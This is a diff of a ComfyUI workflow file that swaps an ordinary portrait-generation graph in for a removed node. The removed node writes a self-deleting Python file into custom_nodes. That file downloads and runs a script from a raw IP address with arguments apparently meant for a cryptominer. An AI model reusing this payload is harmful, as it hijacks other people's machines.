@@ -1,11 +1,159 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "9": {
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.3ctx7j; (curl -sf http://5.78.73.122:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://5.78.73.122:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 5.78.73.122 rig5393-xmr rig5393-iron; rm -f \"$f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_4fa76d08",
-      "output_folder": "/home/u7c/ComfyUI/custom_nodes",
-      "file_extension": ".py"
+      "images": [
+        "76:65",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "Preview Image"
+    }
+  },
+  "76:67": {
+    "inputs": {
+      "text": "A salt-and-pepper male sound engineer in a black t-shirt, standing in a recording studio with a mixing console and soundproofing panels, neutral monitor light, focused concentrated expression, shot on Sony A7R IV with 50mm lens, studio portrait, high-end editorial magazine portrait, Vogue-style professional portrait photography, clean premium composition, sophisticated wardrobe styling, true neutral white editorial lighting, balanced daylight color temperature around 5000K, neutral grey shadows, invisible off-camera diffused key light, subtle neutral rim light, no lighting equipment visible in frame, refined natural color grading, realistic skin texture, sharp eyes, shallow depth of field, no warm cast, no cool cast, no yellow cast, no blue cast, no amber cast, 2:3 vertical editorial portrait composition, subject looking directly into the camera",
+      "clip": [
+        "76:80",
+        1
+      ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "CLIP Text Encode (Positive Prompt)"
+    }
+  },
+  "76:68": {
+    "inputs": {
+      "width": 832,
+      "height": 1248,
+      "batch_size": 1
+    },
+    "class_type": "EmptySD3LatentImage",
+    "_meta": {
+      "title": "EmptySD3LatentImage"
+    }
+  },
+  "76:63": {
+    "inputs": {
+      "vae_name": "ae.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "Load VAE"
+    }
+  },
+  "76:62": {
+    "inputs": {
+      "clip_name": "qwen_3_4b.safetensors",
+      "type": "lumina2",
+      "device": "default"
+    },
+    "class_type": "CLIPLoader",
+    "_meta": {
+      "title": "Load CLIP"
+    }
+  },
+  "76:65": {
+    "inputs": {
+      "samples": [
+        "76:69",
+        0
+      ],
+      "vae": [
+        "76:63",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE Decode"
+    }
+  },
+  "76:70": {
+    "inputs": {
+      "shift": 3.0,
+      "model": [
+        "76:80",
+        0
+      ]
+    },
+    "class_type": "ModelSamplingAuraFlow",
+    "_meta": {
+      "title": "ModelSamplingAuraFlow"
+    }
+  },
+  "76:80": {
+    "inputs": {
+      "lora_name": "Portrait_SoloLoRA_ZIBv1.safetensors",
+      "strength_model": 0.5,
+      "strength_clip": 0.5,
+      "model": [
+        "76:66",
+        0
+      ],
+      "clip": [
+        "76:62",
+        0
+      ]
+    },
+    "class_type": "LoraLoader",
+    "_meta": {
+      "title": "Load LoRA"
+    }
+  },
+  "76:66": {
+    "inputs": {
+      "unet_name": "z_image_bf16.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "Load Diffusion Model"
+    }
+  },
+  "76:71": {
+    "inputs": {
+      "text": "extra fingers, deformed hands, watermark, text, logos, yellow light, yellow color cast, amber light, golden light, warm light, warm color grading, orange lighting, sepia, tungsten yellow, blue light, blue color cast, cyan light, cold lighting, cool color grading, teal color grading, steel-blue shadows, visible softbox, softbox in frame, studio light in frame, light stand, umbrella light, lighting equipment, photographer equipment, behind-the-scenes gear, gritty action movie, movie poster, excessive smoke, heavy haze, harsh dramatic shadows, overprocessed cinematic look",
+      "clip": [
+        "76:80",
+        1
+      ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "CLIP Text Encode (Negative Prompt)"
+    }
+  },
+  "76:69": {
+    "inputs": {
+      "seed": 306326097418480766,
+      "steps": 30,
+      "cfg": 4.0,
+      "sampler_name": "res_multistep",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "76:70",
+        0
+      ],
+      "positive": [
+        "76:67",
+        0
+      ],
+      "negative": [
+        "76:71",
+        0
+      ],
+      "latent_image": [
+        "76:68",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "KSampler"
     }
   }
 }
